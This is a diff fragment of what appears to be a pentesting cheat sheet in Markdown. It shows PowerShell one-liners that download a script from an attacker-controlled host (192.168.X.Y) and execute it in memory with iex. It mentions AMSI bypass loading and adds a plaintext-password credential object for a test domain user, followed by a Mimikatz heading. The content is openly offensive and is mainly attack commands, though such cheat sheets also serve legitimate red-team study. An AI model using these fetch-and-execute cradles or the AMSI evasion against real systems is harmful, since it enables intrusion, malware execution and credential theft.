@@ -4,6 +4,10 @@ Bypass folder of web server will have AMSI bypass splitted and loaded in parts, 
 # Load script to memory
 (New-Object System.Net.WebClient).DownloadString('http://192.168.X.Y/Tools/Random-Script.ps1') | iex
 IEX (New-Object Net.WebClient).DownloadString('http://192.168.X.Y/Tools/Random-Script.ps1')
+
+# Create credential object
+$SecPassword = ConvertTo-SecureString 'BurgerBurgerBurger!' -AsPlainText -Force
+$Cred = New-Object System.Management.Automation.PSCredential('TESTLAB\dfm.a', $SecPassword)
 ```
 
 ### Mimikatz
